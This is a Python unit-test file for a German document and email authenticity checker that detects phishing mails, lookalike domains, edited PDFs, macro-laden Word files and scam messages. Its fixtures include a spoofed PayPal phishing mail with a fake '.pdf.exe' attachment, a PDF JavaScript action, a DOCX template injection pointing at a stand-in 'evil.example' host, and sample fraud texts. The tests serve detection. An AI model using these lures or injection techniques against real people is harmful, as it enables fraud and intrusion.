import io
import unittest
import zipfile

from echtheitspruefer import pruefe_dokument, pruefe_mail
from echtheitspruefer.domains import lookalike_pruefung


def stufen(bericht):
    return {(b.stufe, b.kategorie) for b in bericht.befunde}


def texte(bericht):
    return " ".join(b.text for b in bericht.befunde)


ECHTE_MAIL = b"""Received: from mx.example.net (mx.example.net [192.0.2.10])
 by mail.empfaenger.de; Mon, 28 Sep 2026 10:00:05 +0200
Received: from out.paypal.de (out.paypal.de [198.51.100.7])
 by mx.example.net; Mon, 28 Sep 2026 10:00:02 +0200
Authentication-Results: mail.empfaenger.de; spf=pass smtp.mailfrom=paypal.de;
 dkim=pass header.d=paypal.de; dmarc=pass header.from=paypal.de
DKIM-Signature: v=1; a=rsa-sha256; d=paypal.de; s=sel; h=from; bh=x; b=y
From: PayPal <service@paypal.de>
To: kunde@empfaenger.de
Subject: Ihr Kontoauszug
Date: Mon, 28 Sep 2026 10:00:00 +0200
Message-ID: <abc@paypal.de>
Content-Type: text/html; charset=utf-8

<p>Hallo, Ihr Auszug ist online: <a href="https://www.paypal.de/konto">www.paypal.de</a></p>
"""

PHISHING_MAIL = b"""Received: from mx.example.net (mx.example.net [192.0.2.10])
 by mail.empfaenger.de; Mon, 28 Sep 2026 10:00:05 +0200
Authentication-Results: mail.empfaenger.de; spf=fail smtp.mailfrom=paypa1-service.com;
 dkim=none; dmarc=fail header.from=paypa1-service.com
From: "PayPal Kundenservice service@paypal.de" <info@paypa1-service.com>
Reply-To: hilfe@irgendwo.ru
To: kunde@empfaenger.de
Subject: Dringend: Ihr Konto wurde gesperrt
Date: Mon, 28 Sep 2026 10:00:00 +0200
Message-ID: <x@paypa1-service.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="B"

--B
Content-Type: text/html; charset=utf-8

<p>Bitte verifizieren Sie Ihr Konto sofort:
<a href="http://203.0.113.5/login">https://www.paypal.de/login</a>
Geben Sie Ihr Passwort ein.</p>
--B
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="Rechnung.pdf.exe"
Content-Transfer-Encoding: base64

TVqQAAMAAAAEAAAA
--B--
"""


class MailTests(unittest.TestCase):
    def test_echte_mail_unauffaellig(self):
        b = pruefe_mail(ECHTE_MAIL, "echt.eml")
        self.assertNotIn(b.hoechste_stufe(), ("mittel", "hoch"), b.render_text(False))
        self.assertIn(("ok", "Authentifizierung"), stufen(b))

    def test_phishing_mail_erkannt(self):
        b = pruefe_mail(PHISHING_MAIL, "phish.eml")
        self.assertEqual(b.hoechste_stufe(), "hoch")
        t = texte(b) + " ".join(u.render_text(False) for u in b.unterberichte)
        self.assertIn("DMARC FEHLGESCHLAGEN", t)
        self.assertIn("paypal", t.lower())
        self.assertIn("in Wahrheit zu '203.0.113.5'", t)
        self.assertIn("Rechnung.pdf.exe", t)
        self.assertIn("Anzeigename zeigt die Adresse", t)
        self.assertIn("ausführbares Programm", t)

    def test_keine_header(self):
        b = pruefe_mail(b"nur text", "x.eml")
        self.assertEqual(b.hoechste_stufe(), "mittel")


class DomainTests(unittest.TestCase):
    def test_lookalikes(self):
        self.assertTrue(lookalike_pruefung("paypa1.com"))
        self.assertTrue(lookalike_pruefung("paypa1-service.com"))
        self.assertTrue(lookalike_pruefung("amazon-kundenkonto.de"))
        self.assertTrue(lookalike_pruefung("sparkase.de"))
        self.assertTrue(lookalike_pruefung("xn--pypal-4ve.com"))
        self.assertTrue(lookalike_pruefung("paypal.com.evil.ru"))
        self.assertFalse(lookalike_pruefung("paypal.de"))
        self.assertFalse(lookalike_pruefung("www.paypal.de"))
        self.assertFalse(lookalike_pruefung("beispiel.de"))


def _pdf(extra_update=False, js=False, producer="Mein Bankensystem 3.1"):
    teile = [b"%PDF-1.7\n", b"1 0 obj << /Type /Catalog"]
    if js:
        teile.append(b" /OpenAction << /S /JavaScript /JS (app.alert(1)) >>")
    teile.append(
        b" >> endobj\n2 0 obj << /Producer (" + producer.encode() + b")"
        b" /CreationDate (D:20260101100000+01'00') /ModDate (D:20260101100000+01'00') >> endobj\n"
        b"trailer << /Root 1 0 R /Info 2 0 R >>\n%%EOF\n"
    )
    if extra_update:
        teile.append(b"2 0 obj << /Producer (Sejda PDF Editor) /ModDate (D:20260315120000+01'00') >> endobj\n"
                     b"trailer << /Root 1 0 R /Info 2 0 R >>\n%%EOF\n")
    return b"".join(teile)


class DokumentTests(unittest.TestCase):
    def test_sauberes_pdf(self):
        b = pruefe_dokument(_pdf(), "auszug.pdf")
        self.assertNotIn(b.hoechste_stufe(), ("mittel", "hoch"), b.render_text(False))

    def test_bearbeitetes_pdf(self):
        b = pruefe_dokument(_pdf(extra_update=True), "auszug.pdf")
        t = texte(b)
        self.assertIn("sejda", t)
        self.assertIn("Speicherstände", t)
        self.assertIn("nach der Erstellung geändert", t)
        self.assertEqual(b.hoechste_stufe(), "mittel")

    def test_pdf_mit_javascript(self):
        b = pruefe_dokument(_pdf(js=True), "x.pdf")
        self.assertEqual(b.hoechste_stufe(), "hoch")

    def test_endung_passt_nicht(self):
        b = pruefe_dokument(b"MZ\x90\x00" + b"\x00" * 100, "foto.jpg")
        self.assertEqual(b.hoechste_stufe(), "hoch")

    def test_docx_mit_makro_und_template(self):
        puffer = io.BytesIO()
        with zipfile.ZipFile(puffer, "w") as z:
            z.writestr("[Content_Types].xml", "<Types/>")
            z.writestr("word/document.xml", "<w:document/>")
            z.writestr("word/vbaProject.bin", b"\x00")
            z.writestr(
                "word/_rels/settings.xml.rels",
                '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                '<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
                'relationships/attachedTemplate" Target="http://evil.example/t.dotm" '
                'TargetMode="External"/></Relationships>',
            )
            z.writestr(
                "docProps/core.xml",
                '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/'
                'metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" '
                'xmlns:dcterms="http://purl.org/dc/terms/"><dc:creator>A</dc:creator>'
                "<cp:lastModifiedBy>B</cp:lastModifiedBy>"
                "<dcterms:created>2026-05-01T10:00:00Z</dcterms:created>"
                "<dcterms:modified>2026-04-01T10:00:00Z</dcterms:modified></cp:coreProperties>",
            )
        b = pruefe_dokument(puffer.getvalue(), "Rechnung.docx")
        t = texte(b)
        self.assertIn("VBA-Makros", t)
        self.assertIn("attachedTemplate", t)
        self.assertIn("vor dem Erstellungsdatum", t)
        self.assertEqual(b.hoechste_stufe(), "hoch")



import os
import tempfile
from unittest import mock

from echtheitspruefer import datenbanken
from echtheitspruefer.mail import pruefe_text


def _einstufung(bericht):
    return bericht.details.get("Einstufung", "")


class EinstufungTests(unittest.TestCase):
    def test_phishing_text(self):
        b = pruefe_text(
            "Von: Sparkasse <info@sparkasse-sicherheit-online.com>\n"
            "Ihr Konto wurde eingeschränkt. Bitte verifizieren Sie sich unter "
            "https://sparkasse-sicherheit-online.com/login – sonst wird Ihre pushTAN deaktiviert."
        )
        self.assertIn("Phishing", _einstufung(b))
        self.assertEqual(b.hoechste_stufe(), "hoch")

    def test_ceo_betrug(self):
        b = pruefe_text(
            "Von: Chef <chef.firma@gmail.com>\nSind Sie am Platz? Ich sitze gerade in einem Meeting. "
            "Bitte vertraulich eine Überweisung ausführen oder Google Play Gutscheine kaufen."
        )
        self.assertIn("Chef", _einstufung(b))

    def test_sextortion(self):
        b = pruefe_text(
            "Ihr Gerät gehackt! Ich habe ein Video über Ihre Webcam aufgenommen. Zahlen Sie 1000 € "
            "in Bitcoin an meine Wallet innerhalb von 48 Stunden, sonst schicke ich es an Ihre Kontakte."
        )
        self.assertIn("Erpressung", _einstufung(b))

    def test_paket(self):
        b = pruefe_text(
            "Ihr Paket konnte nicht zugestellt werden. Bitte zahlen Sie die Zollgebühr von 1,99 € "
            "für eine neue Zustellung: https://dhl-zustellung-info.top/pay"
        )
        self.assertIn("Paket", _einstufung(b))

    def test_harmloser_text(self):
        b = pruefe_text("Hallo Anna, treffen wir uns morgen um 10 Uhr zum Kaffee? Liebe Grüße, Tom")
        self.assertEqual(b.hoechste_stufe(), "info")
        self.assertIn("Keine typische", _einstufung(b))

    def test_echte_mail_nicht_als_betrug(self):
        b = pruefe_mail(ECHTE_MAIL, "echt.eml")
        self.assertNotIn(b.hoechste_stufe(), ("mittel", "hoch"))

    def test_vollstaendige_mail_als_text(self):
        b = pruefe_text(PHISHING_MAIL.decode())
        self.assertEqual(b.titel, "E-Mail-Prüfung")
        self.assertIn("DMARC FEHLGESCHLAGEN", texte(b))


class DatenbankTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        with open(os.path.join(self.tmp.name, "phishing_domains.txt"), "w") as f:
            f.write("boese-bank-login.com\nsites.google.com\n")
        with open(os.path.join(self.tmp.name, "urlhaus_online.txt"), "w") as f:
            f.write("# kommentar\nhttp://198.51.100.9/malware.exe\n")
        p = mock.patch.object(datenbanken, "CACHE", datenbanken.Path(self.tmp.name))
        p.start()
        self.addCleanup(p.stop)
        env = mock.patch.dict(os.environ, {}, clear=False)
        env.start()
        self.addCleanup(env.stop)
        for k in ("VIRUSTOTAL_API_KEY", "GOOGLE_SAFEBROWSING_KEY", "ABUSECH_AUTH_KEY"):
            os.environ.pop(k, None)

    def test_treffer(self):
        e = datenbanken.pruefe_urls([
            "https://secure.boese-bank-login.com/x", "http://198.51.100.9/malware.exe",
            "https://sites.google.com/view/a", "https://www.beispiel.de/",
        ])
        stufen_ = sorted((t.quelle, t.stufe) for t in e.treffer)
        self.assertEqual(stufen_, [("Phishing.Database", "hoch"), ("Phishing.Database", "mittel"),
                                   ("URLhaus", "hoch")])
        self.assertEqual(e.fehler, [])

    def test_text_mit_datenbank(self):
        b = pruefe_text("Bitte hier anmelden: https://boese-bank-login.com/", online=True)
        self.assertIn("PHISHING-Seite", texte(b))
        self.assertIn("Phishing", _einstufung(b))


class VirenscanTests(unittest.TestCase):
    def test_virusfund(self):
        with mock.patch("echtheitspruefer.virenscan.clamav_scan", return_value=("virus", "Eicar-Test")):
            b = pruefe_dokument(b"%PDF-1.4\n%%EOF", "x.pdf")
        self.assertEqual(b.hoechste_stufe(), "hoch")
        self.assertIn("Eicar-Test", texte(b))

    def test_ohne_clamav(self):
        with mock.patch("echtheitspruefer.virenscan.shutil.which", return_value=None):
            b = pruefe_dokument(b"%PDF-1.4\n%%EOF", "x.pdf")
        self.assertIn("Kein lokaler Virenscanner", texte(b))


if __name__ == "__main__":
    unittest.main()
